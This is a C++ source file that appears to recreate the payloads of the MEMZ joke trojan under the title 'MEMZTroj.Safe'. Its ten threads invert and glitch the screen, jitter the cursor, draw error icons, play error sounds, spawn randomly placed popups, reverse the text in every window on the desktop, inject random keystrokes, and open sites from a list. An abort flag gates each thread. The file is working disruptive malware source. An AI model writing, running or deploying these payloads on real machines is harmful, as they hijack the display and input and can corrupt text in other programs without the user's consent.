#include "memz.h"
#include "data.h"

static bool ShouldRunPayload() {
    return !g_AbortRequested.load() && g_EffectsActive.load();
}

// 1. Screen inversion (NOTSRCCOPY)
DWORD WINAPI PayloadBlinkThread(LPVOID lpParam) {
    (void)lpParam;
    while (!g_AbortRequested.load()) {
        if (ShouldRunPayload()) {
            HWND hwnd = GetDesktopWindow();
            HDC hdc = GetWindowDC(hwnd);
            if (hdc) {
                RECT rect;
                GetWindowRect(hwnd, &rect);
                int w = rect.right - rect.left;
                int h = rect.bottom - rect.top;
                if (w > 0 && h > 0) {
                    BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
                }
                ReleaseDC(hwnd, hdc);
            }
            Sleep(140);
        } else {
            Sleep(50);
        }
    }
    return 0;
}

// 2. Random screen block glitches (SRCCOPY)
DWORD WINAPI PayloadPuzzleThread(LPVOID lpParam) {
    (void)lpParam;
    while (!g_AbortRequested.load()) {
        if (ShouldRunPayload()) {
            HWND hwnd = GetDesktopWindow();
            HDC hdc = GetWindowDC(hwnd);
            if (hdc && g_ScreenW > 120 && g_ScreenH > 120) {
                int maxW = (g_ScreenW / 3 < 600) ? (g_ScreenW / 3) : 600;
                int maxH = (g_ScreenH / 3 < 600) ? (g_ScreenH / 3) : 600;
                if (maxW >= g_ScreenW) maxW = g_ScreenW - 1;
                if (maxH >= g_ScreenH) maxH = g_ScreenH - 1;

                int wRange = (maxW > 40) ? (maxW - 40) : 1;
                int hRange = (maxH > 40) ? (maxH - 40) : 1;
                int w = 40 + (SecureRandomInt() % wRange);
                int h = 40 + (SecureRandomInt() % hRange);
                if (w >= g_ScreenW) w = g_ScreenW - 1;
                if (h >= g_ScreenH) h = g_ScreenH - 1;
                if (w < 1) w = 1;
                if (h < 1) h = 1;

                int xRange = g_ScreenW - w;
                int yRange = g_ScreenH - h;
                if (xRange > 0 && yRange > 0) {
                    int x1 = SecureRandomInt() % xRange;
                    int y1 = SecureRandomInt() % yRange;
                    int x2 = SecureRandomInt() % xRange;
                    int y2 = SecureRandomInt() % yRange;
                    BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, SRCCOPY);
                }
                ReleaseDC(hwnd, hdc);
            } else if (hdc) {
                ReleaseDC(hwnd, hdc);
            }
            Sleep(65);
        } else {
            Sleep(50);
        }
    }
    return 0;
}

// 3. Inward tunnel effect (StretchBlt)
DWORD WINAPI PayloadTunnelThread(LPVOID lpParam) {
    (void)lpParam;
    while (!g_AbortRequested.load()) {
        if (ShouldRunPayload()) {
            HWND hwnd = GetDesktopWindow();
            HDC hdc = GetWindowDC(hwnd);
            if (hdc && g_ScreenW > 120 && g_ScreenH > 120) {
                StretchBlt(hdc, 40, 30, g_ScreenW - 80, g_ScreenH - 60,
                    hdc, 0, 0, g_ScreenW, g_ScreenH, SRCCOPY);
                ReleaseDC(hwnd, hdc);
            }
            Sleep(80);
        } else {
            Sleep(50);
        }
    }
    return 0;
}

// 4. Cursor jitter
DWORD WINAPI PayloadCursorJitterThread(LPVOID lpParam) {
    (void)lpParam;
    int runtime = 0;
    while (!g_AbortRequested.load()) {
        if (ShouldRunPayload()) {
            POINT pt;
            if (GetCursorPos(&pt)) {
                int maxStep = 2 + (runtime / 350);
                if (maxStep > 14) maxStep = 14;
                if (maxStep < 1) maxStep = 1;
                int dx = ((SecureRandomInt() % 3) - 1) * (SecureRandomInt() % maxStep);
                int dy = ((SecureRandomInt() % 3) - 1) * (SecureRandomInt() % maxStep);
                int nx = pt.x + dx;
                int ny = pt.y + dy;
                if (nx < 0) nx = 0;
                if (ny < 0) ny = 0;
                if (nx >= g_ScreenW) nx = g_ScreenW - 1;
                if (ny >= g_ScreenH) ny = g_ScreenH - 1;
                SetCursorPos(nx, ny);
            }
            if (runtime < 1000000) {
                ++runtime;
            }
            Sleep(25);
        } else {
            runtime = 0;
            Sleep(50);
        }
    }
    return 0;
}

// 5. Error & warning icons drawn on desktop
DWORD WINAPI PayloadErrorIconsThread(LPVOID lpParam) {
    (void)lpParam;
    int ix = GetSystemMetrics(SM_CXICON) / 2;
    int iy = GetSystemMetrics(SM_CYICON) / 2;
    HICON hErr = LoadIconW(nullptr, IDI_ERROR);
    HICON hWarn = LoadIconW(nullptr, IDI_WARNING);

    while (!g_AbortRequested.load()) {
        if (ShouldRunPayload()) {
            HWND hwnd = GetDesktopWindow();
            HDC hdc = GetWindowDC(hwnd);
            if (hdc) {
                POINT pt;
                if (GetCursorPos(&pt) && hErr) {
                    DrawIcon(hdc, pt.x - ix, pt.y - iy, hErr);
                }
                if (hWarn && (SecureRandomInt() % 4 == 0) && g_ScreenW > 0 && g_ScreenH > 0) {
                    DrawIcon(hdc, SecureRandomInt() % g_ScreenW, SecureRandomInt() % g_ScreenH, hWarn);
                }
                ReleaseDC(hwnd, hdc);
            }
            Sleep(30);
        } else {
            Sleep(50);
        }
    }
    return 0;
}

// 6. System error sounds
DWORD WINAPI PayloadSoundThread(LPVOID lpParam) {
    (void)lpParam;
    while (!g_AbortRequested.load()) {
        if (ShouldRunPayload()) {
            const char* alias = g_SoundAliases[SecureRandomInt() % g_NumSoundAliases];
            PlaySoundA(alias, nullptr, SND_ALIAS | SND_ASYNC);
            Sleep(350 + (SecureRandomInt() % 300));
        } else {
            Sleep(60);
        }
    }
    return 0;
}

// 7. Randomly positioned message boxes
static LRESULT CALLBACK RandomPosBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_CREATEWND) {
        CREATESTRUCTW* pcs = reinterpret_cast<CBT_CREATEWNDW*>(lParam)->lpcs;
        if (pcs && ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP))) {
            int maxX = (g_ScreenW > pcs->cx) ? (g_ScreenW - pcs->cx) : 1;
            int maxY = (g_ScreenH > pcs->cy) ? (g_ScreenH - pcs->cy) : 1;
            pcs->x = SecureRandomInt() % maxX;
            pcs->y = SecureRandomInt() % maxY;
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

static DWORD WINAPI SinglePopupThread(LPVOID lpParam) {
    (void)lpParam;
    if (!ShouldRunPayload()) return 0;
    const wchar_t* text = g_PopupMessages[SecureRandomInt() % g_NumPopupMessages];
    HHOOK hook = SetWindowsHookExW(WH_CBT, RandomPosBoxHook, nullptr, GetCurrentThreadId());
    MessageBoxW(nullptr, text, L"MEMZTroj.Safe", MB_OK | MB_ICONWARNING | MB_TOPMOST);
    if (hook) {
        UnhookWindowsHookEx(hook);
    }
    return 0;
}

DWORD WINAPI PayloadPopupsThread(LPVOID lpParam) {
    (void)lpParam;
    while (!g_AbortRequested.load()) {
        if (ShouldRunPayload()) {
            HANDLE hThread = CreateThread(nullptr, 0, SinglePopupThread, nullptr, 0, nullptr);
            if (hThread) CloseHandle(hThread);
            Sleep(900 + (SecureRandomInt() % 900));
        } else {
            Sleep(60);
        }
    }
    return 0;
}

// 8. Reverse text on child windows
static BOOL CALLBACK EnumReverseChildProc(HWND hwnd, LPARAM lParam) {
    (void)lParam;
    if (!ShouldRunPayload()) return FALSE;
    wchar_t buf[2048] = { 0 };
    if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 2048, reinterpret_cast<LPARAM>(buf), SMTO_ABORTIFHUNG, 80, nullptr) > 0) {
        ReverseWideStringInPlace(buf);
        SendMessageTimeoutW(hwnd, WM_SETTEXT, 0, reinterpret_cast<LPARAM>(buf), SMTO_ABORTIFHUNG, 80, nullptr);
    }
    return TRUE;
}

DWORD WINAPI PayloadReverseTextThread(LPVOID lpParam) {
    (void)lpParam;
    while (!g_AbortRequested.load()) {
        if (ShouldRunPayload()) {
            EnumChildWindows(GetDesktopWindow(), EnumReverseChildProc, 0);
            Sleep(250);
        } else {
            Sleep(60);
        }
    }
    return 0;
}

// 9. Random alphanumeric key presses
DWORD WINAPI PayloadRandomKeysThread(LPVOID lpParam) {
    (void)lpParam;
    while (!g_AbortRequested.load()) {
        if (ShouldRunPayload()) {
            INPUT inp = { 0 };
            inp.type = INPUT_KEYBOARD;
            inp.ki.wVk = static_cast<WORD>(0x30 + (SecureRandomInt() % (0x5A - 0x30)));
            SendInput(1, &inp, sizeof(INPUT));
            inp.ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(1, &inp, sizeof(INPUT));
            Sleep(350 + (SecureRandomInt() % 350));
        } else {
            Sleep(60);
        }
    }
    return 0;
}

// 10. Open sample sites/tools
DWORD WINAPI PayloadOpenSitesThread(LPVOID lpParam) {
    (void)lpParam;
    while (!g_AbortRequested.load()) {
        if (ShouldRunPayload()) {
            const char* target = g_SampleSites[SecureRandomInt() % g_NumSampleSites];
            ShellExecuteA(nullptr, "open", target, nullptr, nullptr, SW_SHOWNORMAL);
            Sleep(2500 + (SecureRandomInt() % 2000));
        } else {
            Sleep(80);
        }
    }
    return 0;
}
